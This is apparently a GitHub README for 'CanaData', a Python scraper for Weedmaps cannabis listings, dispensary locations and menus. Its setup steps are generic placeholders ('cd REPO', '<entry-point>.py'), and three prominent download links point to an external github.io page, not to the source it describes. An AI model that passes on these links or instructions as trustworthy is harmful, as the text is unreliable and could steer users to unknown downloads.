# CanaData - Cannabis Market Data Scraper 2026

> **CanaData is a cross-platform Python application for collecting Weedmaps cannabis listings, dispensary location information, and menu records for structured CSV workflows.**

[![Platform](https://img.shields.io/badge/Platform-Cross--platform%20Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/danielkingvvlk3768/canadata-cannabis-data?style=flat-square)](https://github.com/danielkingvvlk3768/canadata-cannabis-data)

---

<p align="center">
  <a href="https://danielkingvvlk3768.github.io/canadata-cannabis-data/">
    <img src="https://img.shields.io/badge/Download-CanaData%20Latest-brightgreen?style=for-the-badge" alt="Download CanaData">
  </a>
</p>

> **[Download CanaData](https://danielkingvvlk3768.github.io/canadata-cannabis-data/)**

---

[Download Latest Build](https://danielkingvvlk3768.github.io/canadata-cannabis-data/)

---

## What CanaData Does

CanaData collects cannabis market information from Weedmaps through a Python-based scraping workflow. The resulting dataset can include coverage by city and state, dispensary location details, menu products, brands, and strains, arranged for inspection or further processing with standard data tools.

The application is intended for researchers, analysts, buyers, and anyone else who needs a structured picture of cannabis listings. Its desktop interface shows current progress and log output, and larger jobs can make use of concurrent processing, request rate limits, and both memory and disk caching.

---

## Capabilities

- Gathers Weedmaps cannabis listings and menu records
- Handles locations across every state or only the states selected by the user
- Accepts user-defined state collections and location slugs
- Writes flattened menu entries and location details to CSV files
- Collects associated brand and strain data
- Offers a desktop GUI with live status logs and progress indicators
- Runs collection work concurrently
- Includes rate limiting together with in-memory and disk-based caching
- Generates HTML reports and dashboards
- Reads configuration from environment settings

---

## Getting Started

First clone the project and move into its directory:

```bash
git clone https://github.com/danielkingvvlk3768/canadata-cannabis-data.git
cd REPO
```

Set up an isolated Python environment:

```bash
python -m venv .venv
```

Activate it on macOS or Linux:

```bash
source .venv/bin/activate
```

For Windows PowerShell, use:

```powershell
.venv\Scripts\Activate.ps1
```

If the repository includes a dependency file, install its packages with:

```bash
pip install -r requirements.txt
```

Start CanaData through the repository's desktop launcher or Python entry point. When a command-line entry point is available, invoke it with Python while the virtual environment is active.

---

## Running a Collection

A standard run can be organized as follows:

1. Open CanaData from the desktop application or the available Python entry point.
2. Choose nationwide processing, provide a custom state selection, or enter particular location slugs.
3. Set request throttling and cache behavior according to the job.
4. Start the collection and follow the live logs and progress display.
5. Inspect the CSV output for flattened menu products and location metadata.
6. Review the generated HTML reports or dashboards for an overview of the collected information.

For automation, modify the repository's Python entry point with the locations and output options you need:

```bash
python <entry-point>.py
```

The name of the entry-point file can differ depending on how the repository is organized.

---

## Environment Configuration

CanaData can be configured through environment variables. Where supported, place local runtime settings in an environment file:

```env
# Example configuration values
STATES=
LOCATION_SLUGS=
RATE_LIMIT=
CACHE_DIR=
OUTPUT_DIR=
```

Set `STATES` to limit processing to particular states, or leave it empty to process all available states. Use `LOCATION_SLUGS` when the collection should target specific locations. `CACHE_DIR` and `OUTPUT_DIR` should reference directories that the application is allowed to read and write.

Do not commit local environment files when they include settings specific to your machine.

---

## System Requirements

- Python runtime
- A supported cross-platform operating system
- Internet connectivity for accessing Weedmaps listings and menu information
- Write permissions for CSV exports, cached data, and HTML report files
- The additional Python packages defined by the repository's dependency configuration
- Enough disk space for collected records, cached responses, and report output

---

## Frequently Asked Questions

### What kinds of users use CanaData?

CanaData is built for people who work with organized cannabis market data, such as researchers, analysts, buyers, and teams evaluating dispensaries and menus.

### Is collection limited to certain locations?

It can be. You may supply a custom list of states or individual location slugs to focus the run on selected areas.

### What output does the application create?

The main collection output is provided as CSV files. CanaData can also produce HTML reports and dashboards, and the output location is configurable through the project settings.

### Where can request and cache settings be changed?

Use the environment configuration and the project's available settings to control rate limiting, caching, and processing behavior. The exact variables supported depend on the repository implementation.

### What can prevent a collection from starting?

Verify that Python and all required packages are installed, the virtual environment is enabled, configured directories are writable, and the selected states or location slugs are valid.

### How are new builds or updates obtained?

Look in the repository for updated releases or refreshed builds. You can use the download link above or update your local repository clone when appropriate.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
